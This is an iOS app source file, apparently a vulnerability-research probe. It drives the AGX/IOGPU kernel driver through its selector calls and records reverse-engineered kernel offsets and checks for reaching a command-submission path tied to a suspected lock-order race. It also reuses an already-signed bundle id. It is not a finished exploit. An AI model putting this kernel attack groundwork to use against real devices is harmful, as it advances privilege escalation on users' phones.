//
//  iogpu_probe.m — IOGPU ABBA 第二阶段探针（v2）
//  身份保持 iogpu_probe / com.yg.ave2poc（复用爱思已签过的 bundle id）
//
//  v1 真机结论（2026-11-22）：
//    · IORegistry 无 IOGPUDevice，只有 AGXAcceleratorG13P_B0（open type=1 成功）
//    · sel 0..31 全 BadArgument（= 都存在，AGX client 能走 IOGPU 表 A）
//    · sel 7 零输入建队列成功 → id=1
//    · sel 26 stride 必须 == [queue->0x530]->0x268 = 0x38；count=0 返回 0xe00002bc
//      （已完整走完 458→528 锁序，只因 queue+0x428==0 提前收尾）
//    · sel 9 零输入 = NoResources（可达，非门控）
//
//  v2 新增离线结论：
//    · queue init = 0x9c1d6c0：structIn 前 0x400 memcpy 到 queue+0x10；+0x400=count(<=4)
//    · queue+0x428 由 sel 25 setNotificationQueue(qid, notif_id) 设置（cin=2）
//    · queue+0x488 在 sel 7 时已设为 device
//
//  v2 目标：建 notification queue / resource，让 sel 26 走完整提交流程
//
//  ★ IOSurface 必须走 dlopen/dlsym：直接 -framework IOSurface 时二进制若在启动期解析不到
//    某个符号，dyld 会在 main 之前终止进程（实测 v2 链接 IOSurface 后启动即死、零日志、
//    无 crash report）。dlsym 方式下符号缺失只会让阶段 E 跳过。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>
#include <dlfcn.h>

typedef struct __IOSurface *IOSurfaceRef;
static IOSurfaceRef   (*fn_IOSurfaceCreate)(CFDictionaryRef);
static uint32_t       (*fn_IOSurfaceGetID)(IOSurfaceRef);
static kern_return_t  (*fn_IOSurfaceLock)(IOSurfaceRef, uint32_t, uint32_t *);
static kern_return_t  (*fn_IOSurfaceUnlock)(IOSurfaceRef, uint32_t, uint32_t *);
static void          *(*fn_IOSurfaceGetBaseAddress)(IOSurfaceRef);
static size_t         (*fn_IOSurfaceGetAllocSize)(IOSurfaceRef);

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002bc: return "Error";
        case 0xe00002be: return "NoResources";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002e2: return "NotPermitted";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[abba2] %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (!docs) docs = NSTemporaryDirectory();
    FILE *f = fopen([[docs stringByAppendingPathComponent:@"abba_probe2.log"] UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length, 0)]; }
        });
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) { gStatus.text = s; gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold]; }
    });
}

static io_connect_t g_conn = MACH_PORT_NULL;
static uint32_t g_qid = 0;
static uint32_t g_notif = 0;
static uint32_t g_res = 0;
static uint32_t g_surfID = 0;

static int iosurface_load(void)
{
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) { L(@"   dlopen IOSurface 失败: %s", dlerror()); return 0; }
    fn_IOSurfaceCreate         = (IOSurfaceRef (*)(CFDictionaryRef))dlsym(h, "IOSurfaceCreate");
    fn_IOSurfaceGetID          = (uint32_t (*)(IOSurfaceRef))dlsym(h, "IOSurfaceGetID");
    fn_IOSurfaceLock           = (kern_return_t (*)(IOSurfaceRef, uint32_t, uint32_t *))dlsym(h, "IOSurfaceLock");
    fn_IOSurfaceUnlock         = (kern_return_t (*)(IOSurfaceRef, uint32_t, uint32_t *))dlsym(h, "IOSurfaceUnlock");
    fn_IOSurfaceGetBaseAddress = (void *(*)(IOSurfaceRef))dlsym(h, "IOSurfaceGetBaseAddress");
    fn_IOSurfaceGetAllocSize   = (size_t (*)(IOSurfaceRef))dlsym(h, "IOSurfaceGetAllocSize");
    int ok = fn_IOSurfaceCreate && fn_IOSurfaceGetID && fn_IOSurfaceLock && fn_IOSurfaceUnlock && fn_IOSurfaceGetBaseAddress;
    L(@"   dlsym: create=%d id=%d lock=%d unlock=%d base=%d alloc=%d",
      !!fn_IOSurfaceCreate, !!fn_IOSurfaceGetID, !!fn_IOSurfaceLock,
      !!fn_IOSurfaceUnlock, !!fn_IOSurfaceGetBaseAddress, !!fn_IOSurfaceGetAllocSize);
    return ok;
}

// ---------------------------------------------------------------- A: open

static void do_open(void)
{
    L(@"");
    L(@"========== A: open AGXAcceleratorG13P_B0 (type=1) ==========");
    CFMutableDictionaryRef m = IOServiceMatching("AGXAcceleratorG13P_B0");
    io_service_t svc = m ? IOServiceGetMatchingService(kIOMainPortDefault, m) : MACH_PORT_NULL;
    if (!svc) { L(@"   未匹配"); return; }
    for (uint32_t t = 0; t <= 3 && g_conn == MACH_PORT_NULL; t++) {
        io_connect_t c = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &c);
        L(@"   type=%u -> 0x%08x %-14s conn=0x%x", t, (uint32_t)kr, kr_name(kr), c);
        if (kr == KERN_SUCCESS) g_conn = c;
    }
    IOObjectRelease(svc);
}

// ---------------------------------------------------------------- B: sel7

static void do_new_queue(void)
{
    L(@"");
    L(@"========== B: sel 7 s_new_command_queue ==========");
    size_t sz = 1032;
    uint8_t *in = calloc(sz, 1);
    if (!in) return;
    for (int v = 0; v < 2; v++) {
        memset(in, 0, sz);
        if (v == 1) *(uint32_t *)(in + 0x400) = 1;
        uint8_t out[16]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallStructMethod(g_conn, 7, in, sz, out, &os);
        uint32_t id = *(uint32_t *)out;
        L(@"   [%d] sel7 +0x400=%u -> 0x%08x %-12s outSize=0x%zx id=%u v2=0x%llx",
          v, (v ? 1u : 0u), (uint32_t)r, kr_name(r), os, id, (unsigned long long)*(uint64_t *)(out + 8));
        if (r == KERN_SUCCESS && id != 0 && g_qid == 0) g_qid = id;
    }
    free(in);
    L(@"   queue id = %u", g_qid);
}

// ---------------------------------------------------------------- C: find create_notificationqueue

// create_notificationqueue 的真身（离线定论）：
//   idx15 handler = 0x9bf4180 → 0x9c0fa1c(device, w1, w2, structureOutput)
//     0x9c0fa38  add w8,w1,#-0x2001 ; cmn w8,#0x2000 ; b.lo FAIL   ⇒ w1 >= 2
//     0x9c0fa44  sub w8,w2,#0x29    ; cmn w8,#0x29   ; b.ls FAIL   ⇒ w2 > 0x52
//     0x9c0fa70  bl 0x9bf276c       ; 插入 device->[0x90] 表并分配 id
//     0x9c0fa78  str w0,[x19,#8]    ; id 落在 structureOutput+8
// 之前传 {qid=1, 0} 两个检查全挂，所以扫不出任何东西。
static void do_probe_notif(void)
{
    L(@"");
    L(@"========== C: create_notificationqueue（按表 A 的 cout/sout 精确匹配） ==========");
    // 表 A 声明：sel12 = cin2/cout1/sout0；sel13 = cin2/cout0/sout16；sel15 = cin2/cout0/sout16
    // 分发器对这四项做精确相等比较，传错尺寸一律 BadArgument（p8 就栽在这）。
    // ★ 修正：create_notificationqueue 是 sel 15（handler 0x9bf4180 → 0x9c0fa1c），
    //   不是 sel 13（0x9bf4144 → 0x9c0f5c8，那是另一个 API，返回的是指针+id 对）。
    //   0x9c0fa1c 的前置：w1 >= 1（0x9c0fa38 add w8,w1,#-0x2001 ; cmn w8,#0x2000 ; b.lo）
    //                    w2 > 0x52（0x9c0fa44 sub w8,w2,#0x29 ; cmn w8,#0x29 ; b.ls）
    //                    id 写 structureOutput+8（0x9c0fa78）
    uint32_t cand[][2] = {
        { 2, 0x53 }, { 0x100, 0x100 }, { 0x1000, 0x1000 }, { 4, 0x60 }
    };
    for (int si = 0; si < 4 && g_notif == 0; si++) {
        uint64_t sc[2] = { cand[si][0], cand[si][1] };
        uint8_t out[16]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallMethod(g_conn, 15, sc, 2, NULL, 0,
                                             NULL, NULL, out, &os);
        L(@"   sel15 {0x%x,0x%x} -> 0x%08x %-12s os=0x%zx out=%08x %08x",
          cand[si][0], cand[si][1], (uint32_t)r, kr_name(r), os,
          *(uint32_t *)out, *(uint32_t *)(out + 8));
        if (r == KERN_SUCCESS) {
            uint32_t id = *(uint32_t *)(out + 8);
            if (!id) id = *(uint32_t *)out;
            if (id) {
                g_notif = id;
                L(@"      ★ notif queue id = %u (sel 15)", id);
            }
        }
    }
    if (!g_notif) L(@"   仍没拿到 notif id");
}

// ---------------------------------------------------------------- D: sel25

static void do_set_notif(void)
{
    L(@"");
    L(@"========== D: sel 25 setNotificationQueue(qid, notif) ==========");
    if (!g_notif) { L(@"   没有 notif id，跳过"); return; }
    // 表 A：idx25 = cin2 / sin0 / cout0 / sout0（原始字节已核对）。
    // handler 0x9bf4244 内部两处 cbz 直接兜底成预置的 BadArgument：
    //   get_queue(scalar[0]) → device->[0x88]；get_notif(scalar[1]) → device->[0x90]
    // 所以 BadArgument = 某个 id 查不到，而不是尺寸问题。把组合扫一遍。
    uint32_t qc[] = { 1, 2, 1, 2, 0, 1 };
    uint32_t nc[] = { 2, 2, 1, 1, 2, 0 };
    for (int i = 0; i < 6; i++) {
        uint64_t sc[2] = { qc[i], nc[i] };
        uint64_t dummy[1] = { 0 };
        uint32_t oc = 0;
        kern_return_t r = IOConnectCallScalarMethod(g_conn, 25, sc, 2, dummy, &oc);
        L(@"   sel25(q=%u,n=%u) -> 0x%08x %s", qc[i], nc[i], (uint32_t)r, kr_name(r));
        if (r == KERN_SUCCESS) {
            L(@"      ★ setNotificationQueue 成功：(q=%u, n=%u)", qc[i], nc[i]);
            break;
        }
    }
}

// ---------------------------------------------------------------- E: IOSurface

static void do_make_surface(void)
{
    L(@"");
    L(@"========== E: 建 IOSurface（给 resType=0x82 用） ==========");
    if (!fn_IOSurfaceCreate) { L(@"   符号缺失，跳过"); return; }
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int32_t w = 256, h = 256, bpe = 4, pf = 0x42475241, alloc = 0x40000;
    CFNumberRef n;
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);     CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);     CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);   CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);    CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), n); CFRelease(n);
    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc); CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);

    IOSurfaceRef s = fn_IOSurfaceCreate(d);
    CFRelease(d);
    if (!s) { L(@"   IOSurfaceCreate 返回 NULL"); return; }
    g_surfID = fn_IOSurfaceGetID ? fn_IOSurfaceGetID(s) : 0;
    size_t asz = fn_IOSurfaceGetAllocSize ? fn_IOSurfaceGetAllocSize(s) : 0;
    void *base = fn_IOSurfaceGetBaseAddress ? fn_IOSurfaceGetBaseAddress(s) : NULL;
    L(@"   surface id=%u allocSize=0x%zx base=%p", g_surfID, asz, base);

    uint32_t seed = 0;
    kern_return_t lk = fn_IOSurfaceLock ? fn_IOSurfaceLock(s, 0, &seed) : (kern_return_t)0xe00002c7;
    if (lk == KERN_SUCCESS) {
        uint8_t *pp = fn_IOSurfaceGetBaseAddress ? (uint8_t *)fn_IOSurfaceGetBaseAddress(s) : NULL;
        if (pp && asz >= 0x40) {
            memset(pp, 0, 0x40);
            *(uint32_t *)(pp + 0x00) = 3;
            *(uint32_t *)(pp + 0x04) = 0x18;
            *(uint32_t *)(pp + 0x08) = 1;
            L(@"   已写入 type=3 命令 (+0=3 +4=0x18 +8=1)");
        }
        if (fn_IOSurfaceUnlock) fn_IOSurfaceUnlock(s, 0, &seed);
    } else {
        L(@"   IOSurfaceLock -> 0x%08x %s", (uint32_t)lk, kr_name(lk));
    }
}

// ---------------------------------------------------------------- F: sel9

// sel 9 resType=0x82 的硬约束（离线实测）：
//   0x9c10670  ldr w1,[structIn+0x38]   ; IOSurface id
//   0x9c10678  bl 0x9c1cfa4             ; device->[0x50]->[0xf0] 表里按 id 查 IOSurface
//   0x9c10684  bl 0x9e72cec             ; = ldr w0,[surface+0x98] = planeCount
//   0x9c1068c  ldr w8,[structIn+0x3c]
//   0x9c10690  cmp w8,w0 ; b.lo FAIL    ; ★ structIn+0x3c 必须 >= planeCount，否则 0xe00002bc
// 之前传 0 -> 必然失败。
static void do_new_resource(void)
{
    L(@"");
    L(@"========== F: sel 9 new_resource（resType=0x82, +0x3c >= planeCount） ==========");
    if (!g_surfID) { L(@"   无 surface id，跳过"); return; }

    // +0x3c 扫一组候选（planeCount 预期为 1，但多试几档以防 surface 是多平面）
    uint32_t pcs[] = { 1, 2, 4, 16 };
    uint32_t extra[] = { 0, 1 };
    for (int a = 0; a < 4 && g_res == 0; a++) {
        for (int b = 0; b < 2 && g_res == 0; b++) {
            uint8_t in[0x58]; memset(in, 0, sizeof(in));
            *(uint32_t *)(in + 0x00) = 0x82;          // resType
            *(uint32_t *)(in + 0x38) = g_surfID;      // IOSurface id
            *(uint32_t *)(in + 0x3c) = pcs[a];        // >= planeCount
            *(uint32_t *)(in + 0x40) = extra[b];      // 传给 newResourceWithIOSurface 的 w4
            uint8_t out[0x400]; memset(out, 0, sizeof(out));
            size_t os = sizeof(out);
            kern_return_t r = IOConnectCallStructMethod(g_conn, 9, in, sizeof(in), out, &os);
            L(@"   0x82 surf=%u +0x3c=%u +0x40=%u -> 0x%08x %-12s outSize=0x%zx",
              g_surfID, pcs[a], extra[b], (uint32_t)r, kr_name(r), os);
            if (r == KERN_SUCCESS) {
                // dump 前 0x40 字节，找 resource id / 句柄
                NSMutableString *hx = [NSMutableString string];
                for (int i = 0; i < 0x40; i += 4)
                    [hx appendFormat:@"%02x%02x%02x%02x ",
                        out[i], out[i+1], out[i+2], out[i+3]];
                L(@"      out[0..0x3f] = %@", hx);
                // 候选 id：常见落点是 +0x08 / +0x00 / +0x20
                uint32_t cands[3] = { *(uint32_t *)(out + 8), *(uint32_t *)(out),
                                      *(uint32_t *)(out + 0x20) };
                for (int c = 0; c < 3; c++) {
                    if (cands[c] && cands[c] < 0x10000) {
                        g_res = cands[c];
                        L(@"      ★ resource id 候选 = %u (out+%d)", cands[c], c == 0 ? 8 : (c == 1 ? 0 : 0x20));
                        break;
                    }
                }
                if (!g_res) L(@"      成功但没识别出 id，看上面的 dump");
                break;
            }
        }
    }
    if (!g_res) L(@"   resType=0x82 全部失败");

    // ---- resType=0x00（普通 sysmem）----
    // 0x9c105fc 的两条有效路径：
    //   (A) w27 != 0  -> 0x9c10944: newResourceWith(dev,[+0x18],[+0x48],[+0x38],[+0x40], out+8, w27)
    //       w27 来自 structIn+0x50，但只有 structIn+0x15 的 bit3 置位时才会读它
    //   (B) w27 == 0 且 structIn+0x18 != 0 -> 0x9c10c88 -> 0x9bff978(device, structIn, out+8)
    //   w27 == 0 且 +0x18 == 0 -> 直接构造错误码（p6 就是这条，所以只能失败）
    if (g_res == 0) {
        L(@"   --- resType=0x00：变体A(w27!=0) / 变体B(+0x18!=0) ---");
        uint64_t sizes[] = { 0x1000, 0x10000 };
        for (int variant = 0; variant < 2 && g_res == 0; variant++) {
            for (int si = 0; si < 2 && g_res == 0; si++) {
                uint64_t sz = sizes[si];
                uint8_t in[0x58]; memset(in, 0, sizeof(in));
                *(uint32_t *)(in + 0x00) = 0x00;
                *(uint64_t *)(in + 0x18) = sz;      // 变体B 靠它；变体A 也一起给
                *(uint64_t *)(in + 0x38) = sz;
                *(uint64_t *)(in + 0x40) = sz;
                *(uint64_t *)(in + 0x48) = sz;
                if (variant == 0) {
                    in[0x15] |= 0x08;               // bit3 -> 读 +0x50 当 w27
                    *(uint32_t *)(in + 0x50) = 1;
                }
                uint8_t out[0x400]; memset(out, 0, sizeof(out));
                size_t os = sizeof(out);
                kern_return_t r = IOConnectCallStructMethod(g_conn, 9, in, sizeof(in), out, &os);
                L(@"   0x00 %s size=0x%llx -> 0x%08x %-12s outSize=0x%zx",
                  variant == 0 ? "A" : "B", (unsigned long long)sz,
                  (uint32_t)r, kr_name(r), os);
                if (r == KERN_SUCCESS) {
                    // 只打非零部分，避免刷屏
                    NSMutableString *hx = [NSMutableString string];
                    int nz = 0;
                    for (int i = 0; i < 0x80; i += 4) {
                        uint32_t w = *(uint32_t *)(out + i);
                        if (w) {
                            [hx appendFormat:@"+%02x=%08x ", i, w];
                            nz++;
                        }
                    }
                    L(@"      out 非零字段(%d): %@", nz, nz ? hx : @"（全零）");
                    if (!nz) L(@"      ⇒ 成功但输出全零：句柄可能不给 userspace，需要另一条引用途径");
                    uint32_t cands[3] = { *(uint32_t *)(out + 8), *(uint32_t *)(out), *(uint32_t *)(out + 0x20) };
                    for (int c = 0; c < 3; c++) {
                        if (cands[c] && cands[c] < 0x10000) {
                            g_res = cands[c];
                            L(@"      ★ resource id 候选 = %u", cands[c]);
                            break;
                        }
                    }
                }
            }
        }
    }
    if (!g_res) L(@"   仍然没有 resource id");
}

// ---------------------------------------------------------------- G: submit

static void do_submit(void)
{
    L(@"");
    L(@"========== G: sel 26 submit（stride=0x38） ==========");
    uint32_t stride = 0x38;
    {
        uint64_t sc[4] = { g_qid, 0, 0, stride };
        size_t os = 0;
        kern_return_t r = IOConnectCallMethod(g_conn, 26, sc, 4, NULL, 0, NULL, NULL, NULL, &os);
        L(@"   count=0 -> 0x%08x %s", (uint32_t)r, kr_name(r));
    }
    // ★ desc+0x20（resource id）为 0 时，内核在 0x9c1def4 处 cbz 直接跳过查表，
    //   继续走向提交路径；所以 count=1 + 全零描述符不依赖 resource，必须试。
    for (int variant = 0; variant < 2; variant++) {
        uint8_t desc[0x38]; memset(desc, 0, sizeof(desc));
        if (variant == 1 && g_res) *(uint32_t *)(desc + 0x20) = g_res;  // 有 id 时顺便用它
        if (variant == 1 && !g_res) break;
        uint64_t sc[4] = { g_qid, 0, 1, stride };
        size_t os = 0;
        kern_return_t r = IOConnectCallMethod(g_conn, 26, sc, 4, desc, sizeof(desc),
                                             NULL, NULL, NULL, &os);
        L(@"   count=1 desc+0x20=%u -> 0x%08x %s",
          *(uint32_t *)(desc + 0x20), (uint32_t)r, kr_name(r));
    }
}

static void run(void)
{
    L(@"===== ABBA probe2 (dlsym build) @ %@ =====", [NSDate date]);
    L(@"uid=%d pid=%d", getuid(), getpid());
    do_open();
    if (g_conn == MACH_PORT_NULL) { L(@"open 失败，终止"); SetStatus(@"open failed"); return; }
    do_new_queue();
    do_probe_notif();
    do_set_notif();
    if (!iosurface_load()) L(@"   IOSurface 不可用（阶段 E 退化）");
    do_make_surface();
    do_new_resource();
    do_submit();
    L(@"");
    L(@"===== 判读 =====");
    L(@"  · F 出 resource id => 命令载体打通");
    L(@"  · G count=1 非 BadArgument => 已进真实提交流程");
    SetStatus(@"done");
    if (g_conn) { IOServiceClose(g_conn); g_conn = MACH_PORT_NULL; }
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("abba2.log", DISPATCH_QUEUE_SERIAL);
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];
    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 30)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"abba probe2";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];
    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 84, self.window.bounds.size.width, h - 84)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:7] ?: [UIFont systemFontOfSize:7];
    gView.editable = NO;
    [vc.view addSubview:gView];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
